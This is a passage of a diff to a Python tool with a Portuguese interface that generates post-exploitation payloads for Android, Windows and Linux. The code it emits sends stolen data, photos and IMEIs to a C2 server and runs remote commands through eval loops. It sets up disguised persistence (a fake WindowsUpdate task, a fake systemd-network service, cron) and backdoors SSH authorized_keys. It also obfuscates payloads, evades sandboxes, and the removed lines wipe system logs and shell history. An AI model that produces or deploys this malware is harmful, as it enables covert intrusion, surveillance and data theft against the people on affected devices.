-            result+="\\nNetdiscover Results:\\n$(netdiscover -r $(ip route | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+/\\d+' 2>/dev/null) 2>/dev/null)\\n"
-        else
-            result+="\\nPing Sweep:\\n"
-            for ip in $(seq 1 254); do
-                ping -c 1 "$(ip route | grep -oP '\\d+\\.\\d+\\.\\d+').$ip" | grep "bytes from" | cut -d" " -f4 &
-            done | sort -u >> "$(mktemp)" && cat "$(mktemp)" && rm -f "$(mktemp)"
-        fi
-    else
-        # Windows network scanning
-        result+="\\nNetwork Configuration:\\n$(ipconfig /all 2>/dev/null)\\n"
-        result+="\\nARP Table:\\n$(arp -a 2>/dev/null)\\n"
-        
-        if command -v nmap &>/dev/null; then
-            result+="\\nNmap Quick Scan:\\n$(nmap -sn $(ipconfig | findstr "IPv4" | awk '{print $NF}' | cut -d. -f1-3).0/24 2>/dev/null)\\n"
-        else
-            result+="\\nPing Sweep:\\n"
-            for ip in $(seq 1 254); do
-                ping -n 1 -w 100 "$(ipconfig | findstr "IPv4" | awk '{print $NF}' | cut -d. -f1-3).$ip" | findstr "Reply" &
-            done | sort -u >> "$(mktemp)" && type "$(mktemp)" && del "$(mktemp)"
-        fi
-    fi
-    
-    send_data "$result"
-}
-"""
-
-    def gen_screenshot(self) -> str:
-        return """
-function take_screenshot() {
-    log "Attempting to take screenshot..."
-    
-    if [ "$OS" = "linux" ]; then
-        if command -v import &>/dev/null; then
-            # Using ImageMagick
-            import -window root /tmp/screenshot.png
-            [ -f "/tmp/screenshot.png" ] && upload_file "/tmp/screenshot.png" && rm -f "/tmp/screenshot.png"
-        elif command -v gnome-screenshot &>/dev/null; then
-            gnome-screenshot -f /tmp/screenshot.png
-            [ -f "/tmp/screenshot.png" ] && upload_file "/tmp/screenshot.png" && rm -f "/tmp/screenshot.png"
-        else
-            log "No screenshot tool available"
-        fi
-    else
-        # Windows screenshot
-        if command -v nircmd &>/dev/null; then
-            nircmd savescreenshot /tmp/screenshot.png
-            [ -f "/tmp/screenshot.png" ] && upload_file "/tmp/screenshot.png" && rm -f "/tmp/screenshot.png"
-        else
-            powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Seconds 1; \$image = [System.Windows.Forms.Clipboard]::GetImage(); \$image.Save('/tmp/screenshot.png');"
-            [ -f "/tmp/screenshot.png" ] && upload_file "/tmp/screenshot.png" && rm -f "/tmp/screenshot.png"
-        fi
-    fi
-}
-"""
-
-    def gen_history(self) -> str:
-        return """
-function collect_history() {
-    log "Collecting command history..."
-    
-    local result="=== COMMAND HISTORY ===\\n"
-    
-    if [ "$OS" = "linux" ]; then
-        result+="\\nBash History:\\n$(cat ~/.bash_history 2>/dev/null | tail -n 50)\\n"
-        result+="\\nCurrent User's History:\\n$(history 2>/dev/null | tail -n 50)\\n"
-        result+="\\nSSH Keys:\\n$(find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null)\\n"
-    else
-        result+="\\nCommand Prompt History:\\n$(doskey /history 2>/dev/null)\\n"
-        result+="\\nPowerShell History:\\n$(type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>/dev/null)\\n"
-        result+="\\nRecent Files:\\n$(dir /a %userprofile%\\Recent 2>/dev/null)\\n"
-    fi
-    
-    send_data "$result"
-}
-"""
-
-    def gen_clean_tracks(self) -> str:
-        return """
-function clean_tracks() {
-    log "Cleaning tracks..."
-    
-    if [ "$OS" = "linux" ]; then
-        # Clear bash history
-        [ -f ~/.bash_history ] && cat /dev/null > ~/.bash_history
-        history -c
-        
-        # Remove log entries
-        find /var/log -type f -exec cp /dev/null {} \;
-        
-        # Remove temporary files
-        rm -rf /tmp/* /var/tmp/*
-    else
-        # Clear Windows logs
-        wevtutil cl System >nul 2>&1
-        wevtutil cl Security >nul 2>&1
-        wevtutil cl Application >nul 2>&1
-        
-        # Clear recent files
-        del /f /q %userprofile%\\Recent\\* >nul 2>&1
-    fi
-    
-    log "Tracks cleaned"
-}
-"""
-
-    def _generate_script_footer(self) -> str:
-        return """
-# Main execution
-log "Starting post-exploitation modules"
-
-# Execute selected modules
-"""
-
-    def exit_tool(self):
         console.print(Panel.fit(
-            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
-            border_style="red"
+            f"[green]✅ Payload gerado com sucesso![/green]\n"
+            f"[cyan]Arquivo:[/cyan] [bold]{nome_arquivo}[/bold]\n"
+            f"[cyan]Tamanho:[/cyan] {os.path.getsize(nome_arquivo)} bytes\n"
+            f"[cyan]Módulos:[/cyan] {', '.join(config['modulos'])}",
+            border_style="green"
         ))
-        console.print("[cyan]Saindo...[/cyan]")
+        
+        input("\nPressione Enter para continuar...")
+    
+    def _aplicar_tecnica_avancada(self, payload: str, tecnica: str) -> str:
+        if tecnica == 'obfuscation':
+            return self._ofuscar_strings(payload)
+        elif tecnica == 'encryption':
+            return self._adicionar_criptografia(payload)
+        elif tecnica == 'anti_debug':
+            return self._adicionar_anti_debug(payload)
+        elif tecnica == 'sandbox_evasion':
+            return self._adicionar_evasao_sandbox(payload)
+        elif tecnica == 'persistence':
+            return self._adicionar_persistencia_avancada(payload)
+        return payload
+    
+    def _ofuscar_codigo(self, payload: str, plataforma: str) -> str:
+        """Ofuscação básica do código"""
+        if plataforma == 'windows':
+            # Ofuscação para PowerShell
+            lines = payload.split('\n')
+            ofuscated = []
+            for line in lines:
+                if line.strip() and not line.strip().startswith('#'):
+                    # Ofuscar variáveis e comandos
+                    ofuscated.append(self._ofuscar_line_powershell(line))
+                else:
+                    ofuscated.append(line)
+            return '\n'.join(ofuscated)
+        else:
+            # Ofuscação para bash
+            return f"eval \"$(echo '{base64.b64encode(payload.encode()).decode()}' | base64 -d)\""
+    
+    def gerar_payload_android(self, config: Dict) -> str:
+        """Gera payload de pós-exploração para Android"""
+        payload = """#!/system/bin/sh
+# Post-Exploitation Android Payload
+# Auto-generated: {timestamp}
+
+C2_SERVER="{c2_server}"
+ENCRYPT_KEY="{encryption_key}"
+""".format(
+            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
+            c2_server=config['c2_server'],
+            encryption_key=config['encryption_key']
+        )
+
+        # Funções básicas
+        payload += """
+# Função para enviar dados para C2
+exfiltrate_data() {
+    local data="$1"
+    local filename="$2"
+    local encrypted_data=$(echo "$data" | openssl enc -aes-256-cbc -salt -pass pass:$ENCRYPT_KEY -base64 2>/dev/null)
+    curl -s -X POST -d "data=$encrypted_data&filename=$filename" $C2_SERVER >/dev/null 2>&1
+}
+
+# Verificar root
+check_root() {
+    if [ "$(id -u)" = "0" ]; then
+        echo "[+] Root access detected"
+        return 0
+    else
+        echo "[-] No root access"
+        return 1
+    fi
+}
+"""
+
+        # Módulos selecionados
+        if 'data_collection' in config['modulos']:
+            payload += """
+# Coleta de dados do sistema
+collect_system_info() {
+    echo "[+] Collecting system information"
+    sys_info="
+Device: $(getprop ro.product.model)
+Android: $(getprop ro.build.version.release)
+Manufacturer: $(getprop ro.product.manufacturer)
+IMEI: $(service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed 's/[^0-9]*//g' | head -1)
+"
+    exfiltrate_data "$sys_info" "system_info.txt"
+}
+"""
+
+        if 'persistence' in config['modulos']:
+            payload += """
+# Mecanismos de persistência
+establish_persistence() {
+    echo "[+] Establishing persistence"
+    # Persistência via init scripts
+    if [ -d /system/etc/init.d ]; then
+        cp $0 /system/etc/init.d/.system_service
+        chmod +x /system/etc/init.d/.system_service
+    fi
+    
+    # Persistência via cron
+    if command -v crontab >/dev/null 2>&1; then
+        (crontab -l 2>/dev/null; echo "@reboot sleep 60 && $0") | crontab -
+    fi
+}
+"""
+
+        if config.get('exfiltrate_photos', False):
+            payload += """
+# Exfiltrar fotos
+exfiltrate_photos() {
+    echo "[+] Exfiltrating photos"
+    photo_dirs="/sdcard/DCIM /sdcard/Pictures /storage/emulated/0/DCIM"
+    for dir in $photo_dirs; do
+        if [ -d "$dir" ]; then
+            find "$dir" -type f \( -name "*.jpg" -o -name "*.png" -o -name "*.jpeg" \) | head -20 | while read photo; do
+                exfiltrate_data "$(base64 -w 0 "$photo" 2>/dev/null)" "$(basename "$photo")"
+            done
+        fi
+    done
+}
+"""
+
+        # Main execution
+        payload += """
+# Execução principal
+echo "[+] Starting post-exploitation modules"
+"""
+
+        for modulo in config['modulos']:
+            if modulo == 'data_collection':
+                payload += "collect_system_info\n"
+            elif modulo == 'persistence':
+                payload += "establish_persistence\n"
+        
+        if config.get('exfiltrate_photos', False):
+            payload += "exfiltrate_photos\n"
+
+        payload += """
+echo "[+] Post-exploitation completed"
+# Mantém o script vivo para conexões futuras
+while true; do
+    sleep 300
+    # Verificar por novos comandos do C2
+    response=$(curl -s "$C2_SERVER/commands")
+    if [ -n "$response" ]; then
+        eval "$response"
+    fi
+done
+"""
+
+        return payload
+
+    def gerar_payload_windows(self, config: Dict) -> str:
+        """Gera payload de pós-exploração para Windows"""
+        payload = """# PowerShell Post-Exploitation Payload
+# Auto-generated: {timestamp}
+
+$C2Server = "{c2_server}"
+$EncryptKey = "{encryption_key}"
+$ErrorActionPreference = "SilentlyContinue"
+""".format(
+            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
+            c2_server=config['c2_server'],
+            encryption_key=config['encryption_key']
+        )
+
+        # Funções básicas
+        payload += """
+# Função para enviar dados
+function Exfiltrate-Data {
+    param($Data, $FileName)
+    $EncryptedData = [System.Convert]::ToBase64String(
+        [System.Text.Encoding]::UTF8.GetBytes($Data)
+    )
+    Invoke-WebRequest -Uri "$C2Server/upload" -Method POST -Body @{
+        data = $EncryptedData
+        filename = $FileName
+    } -UseBasicParsing | Out-Null
+}
+
+# Função para executar comandos stealth
+function Invoke-StealthCommand {
+    param($Command)
+    try {
+        $Result = Invoke-Expression $Command 2>&1 | Out-String
+        return $Result
+    } catch {
+        return $_.Exception.Message
+    }
+}
+"""
+
+        # Módulos selecionados
+        if 'credential_harvesting' in config['modulos']:
+            payload += """
+# Coleta de credenciais do navegador
+function Get-BrowserCredentials {
+    echo "[+] Harvesting browser credentials"
+    # Chrome credentials extraction would go here
+    $creds = "Browser credentials placeholder"
+    Exfiltrate-Data $creds "browser_creds.txt"
+}
+"""
+
+        if 'persistence' in config['modulos']:
+            payload += """
+# Estabelecer persistência
+function Establish-Persistence {
+    echo "[+] Establishing persistence"
+    # Registry persistence
+    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -File $PSCommandPath"
+    
+    # Scheduled task
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $PSCommandPath"
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -User "SYSTEM" -Force
+}
+"""
+
+        # Main execution
+        payload += """
+# Main execution
+echo "[+] Starting Windows post-exploitation"
+"""
+
+        for modulo in config['modulos']:
+            if modulo == 'credential_harvesting':
+                payload += "Get-BrowserCredentials\n"
+            elif modulo == 'persistence':
+                payload += "Establish-Persistence\n"
+
+        payload += """
+# Command and control loop
+while ($true) {
+    try {
+        $command = Invoke-WebRequest -Uri "$C2Server/getcommand" -UseBasicParsing | Select-Object -Expand Content
+        if ($command -ne "none") {
+            $result = Invoke-StealthCommand $command
+            Exfiltrate-Data $result "command_result.txt"
+        }
+    } catch {}
+    Start-Sleep -Seconds 300
+}
+"""
+
+        return payload
+
+    def gerar_payload_linux(self, config: Dict) -> str:
+        """Gera payload de pós-exploração para Linux"""
+        payload = """#!/bin/bash
+# Linux Post-Exploitation Payload
+# Auto-generated: {timestamp}
+
+C2_SERVER="{c2_server}"
+ENCRYPT_KEY="{encryption_key}"
+""".format(
+            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
+            c2_server=config['c2_server'],
+            encryption_key=config['encryption_key']
+        )
+
+        # Funções básicas
+        payload += """
+# Funções de utilidade
+exfiltrate_data() {
+    local data="$1"
+    local filename="$2"
+    local encrypted_data=$(echo "$data" | openssl enc -aes-256-cbc -salt -pass pass:$ENCRYPT_KEY -base64 2>/dev/null)
+    curl -s -X POST -d "data=$encrypted_data&filename=$filename" $C2_SERVER >/dev/null 2>&1
+}
+
+check_privileges() {
+    if [ "$(id -u)" -eq 0 ]; then
+        echo "[+] Root privileges detected"
+        return 0
+    else
+        echo "[-] Regular user privileges"
+        return 1
+    fi
+}
+"""
+
+        # Módulos selecionados
+        if 'privilege_escalation' in config['modulos']:
+            payload += """
+# Tentativa de escalação de privilégios
+attempt_privilege_escalation() {
+    echo "[+] Attempting privilege escalation"
+    # Common Linux privilege escalation vectors
+    vectors=(
+        "sudo -l"
+        "find / -perm -4000 2>/dev/null"
+        "cat /etc/crontab"
+        "ls -la /etc/cron.*"
+        "uname -a"
+        "cat /etc/passwd"
+    )
+    
+    results=""
+    for vector in "${vectors[@]}"; do
+        results+="\n=== $vector ===\n"
+        results+="$($vector 2>&1)\n"
+    done
+    
+    exfiltrate_data "$results" "privilege_escalation.txt"
+}
+"""
+
+        if 'persistence' in config['modulos']:
+            payload += """
+# Estabelecer persistência
+establish_persistence() {
+    echo "[+] Establishing persistence"
+    # Cron persistence
+    (crontab -l 2>/dev/null; echo "@reboot sleep 120 && /bin/bash $0") | crontab -
+    
+    # SSH backdoor
+    if [ -f ~/.ssh/authorized_keys ]; then
+        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> ~/.ssh/authorized_keys
+    fi
+    
+    # Systemd service if root
+    if [ "$(id -u)" -eq 0 ]; then
+        cat > /etc/systemd/system/systemd-network.service << EOF
+[Unit]
+Description=Systemd Network Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash $0
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+EOF
+        systemctl enable systemd-network.service
+        systemctl start systemd-network.service
+    fi
+}
+"""
+
+        # Main execution
+        payload += """
+# Execução principal
+echo "[+] Starting Linux post-exploitation"
+"""
+
+        for modulo in config['modulos']:
+            if modulo == 'privilege_escalation':
+                payload += "attempt_privilege_escalation\n"
+            elif modulo == 'persistence':
+                payload += "establish_persistence\n"
+
+        payload += """
+# Loop de C2
+while true; do
+    sleep 300
+    command=$(curl -s "$C2_SERVER/get_command")
+    if [ -n "$command" ] && [ "$command" != "none" ]; then
+        result=$(eval "$command" 2>&1)
+        exfiltrate_data "$result" "command_output.txt"
+    fi
+done
+"""
+
+        return payload
+
+    def _ofuscar_strings(self, payload: str) -> str:
+        """Ofusca strings no payload"""
+        # Implementação básica de ofuscação
+        lines = payload.split('\n')
+        ofuscated = []
+        for line in lines:
+            if 'C2_SERVER' in line or 'c2_server' in line:
+                # Ofuscar URL do C2
+                parts = line.split('=')
+                if len(parts) == 2:
+                    url = parts[1].strip().strip('"')
+                    encoded_url = base64.b64encode(url.encode()).decode()
+                    line = f"{parts[0]}=$(echo {encoded_url} | base64 -d)"
+            ofuscated.append(line)
+        return '\n'.join(ofuscated)
+
+    def _adicionar_criptografia(self, payload: str) -> str:
+        """Adiciona camada de criptografia"""
+        encryption_wrapper = """
+# Camada de criptografia avançada
+encrypt_payload() {
+    local key="$(echo {key} | base64 -d)"
+    # Implementação de criptografia aqui
+}
+""".format(key=base64.b64encode(self.encryption_key.encode()).decode())
+        
+        return encryption_wrapper + payload
+
+    def _adicionar_anti_debug(self, payload: str) -> str:
+        """Adiciona técnicas anti-debug"""
+        anti_debug = """
+# Técnicas anti-debugging
+anti_debug() {
+    # Verificar se está sendo debugado
+    if [ -n "$TRACE" ] || [ -n "$DEBUG" ]; then
+        exit 0
+    fi
+    # Outras técnicas anti-debug aqui
+}
+"""
+        return anti_debug + payload
+
+    def _adicionar_evasao_sandbox(self, payload: str) -> str:
+        """Adiciona técnicas de evasão de sandbox"""
+        sandbox_evasion = """
+# Evasão de sandbox
+check_sandbox() {
+    # Verificar características de sandbox
+    if [ -f "/.dockerenv" ] || [ -f "/run/.containerenv" ]; then
+        exit 0
+    fi
+    # Outras verificações de sandbox aqui
+}
+"""
+        return sandbox_evasion + payload
+
+    def _adicionar_persistencia_avancada(self, payload: str) -> str:
+        """Adiciona mecanismos avançados de persistência"""
+        advanced_persistence = """
+# Persistência avançada
+advanced_persistence() {
+    # Múltiplos métodos de persistência
+    # ...
+}
+"""
+        return advanced_persistence + payload
+
+    def _ofuscar_line_powershell(self, line: str) -> str:
+        """Ofusca linha do PowerShell"""
+        # Ofuscação básica para PowerShell
+        if '$' in line and '=' in line:
+            parts = line.split('=')
+            if len(parts) == 2:
+                var_name = parts[0].strip()
+                value = parts[1].strip()
+                # Ofuscar nome de variável
+                ofuscated_var = ''.join([f"[char]{ord(c)}+" for c in var_name])[:-1]
+                return f"${ofuscated_var} = {value}"
+        return line
+
+    def _preview_payload(self, payload: str, plataforma: str):
+        """Mostra preview do payload"""
+        console.print(Panel.fit(
+            "[bold]👁️ PREVIEW DO PAYLOAD[/bold]",
+            border_style="yellow"
+        ))
+        
+        # Mostrar apenas as primeiras linhas
+        lines = payload.split('\n')[:20]
+        preview = '\n'.join(lines)
+        
+        if plataforma == 'windows':
+            console.print(Syntax(preview, "powershell"))
+        else:
+            console.print(Syntax(preview, "bash"))
+        
+        if len(payload.split('\n')) > 20:
+            console.print("[yellow]... (visualização truncada)[/yellow]")
+
+    def _mostrar_menu_configuracao(self):
+        """Menu de configurações"""
+        while True:
+            console.clear()
+            console.print(Panel.fit(
+                "[bold]⚙️ CONFIGURAÇÕES[/bold]",
+                border_style="blue"
+            ))
+            
+            console.print(f"1. Servidor C2: [cyan]{self.c2_server}[/cyan]")
+            console.print(f"2. Chave de criptografia: [yellow]{self.encryption_key}[/yellow]")
+            console.print("3. Testar conectividade C2")
+            console.print("0. Voltar")
+            
+            escolha = Prompt.ask(
+                "[blink yellow]➤[/blink yellow] Selecione uma opção",
+                choices=["0", "1", "2", "3"],
+                show_choices=False
+            )
+            
+            if escolha == "1":
+                novo_c2 = Prompt.ask("Novo servidor C2", default=self.c2_server)
+                self.c2_server = novo_c2
+            elif escolha == "2":
+                nova_chave = Prompt.ask("Nova chave de criptografia", default=self.encryption_key)
+                self.encryption_key = nova_chave
+            elif escolha == "3":
+                self._testar_conectividade_c2()
+            elif escolha == "0":
+                return
+
+    def _testar_conectividade_c2(self):
+        """Testa conectividade com o servidor C2"""
+        console.print("[yellow]Testando conectividade com C2...[/yellow]")
+        try:
+            # Simulação de teste
+            time.sleep(2)
+            console.print("[green]✅ Conexão com C2 estabelecida[/green]")
+        except:
+            console.print("[red]❌ Falha na conexão com C2[/red]")
+        time.sleep(1)
+
+    def _sair(self):
+        """Sair do programa"""
+        console.print(Panel.fit(
+            "[bold green]👋 Operação concluída![/bold green]",
+            border_style="green"
+        ))
         time.sleep(1)
         sys.exit(0)
 
+    def executar(self):
+        """Função principal"""
+        try:
+            self.mostrar_menu_principal()
+        except KeyboardInterrupt:
+            console.print("\n[yellow]Operação cancelada pelo usuário[/yellow]")
+        except Exception as e:
+            console.print(f"\n[red]Erro: {str(e)}[/red]")
+
 def main():
-    try:
-        generator = PostExploitGen()
-        generator.main_menu()
-    except KeyboardInterrupt:
-        console.print("\n[red]✗ Cancelado[/red]")
-        sys.exit(0)
-    except Exception as e:
-        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
-        sys.exit(1)
+    generator = PostExploitationGenerator()
+    generator.executar()
 
 if __name__ == '__main__':
     main()
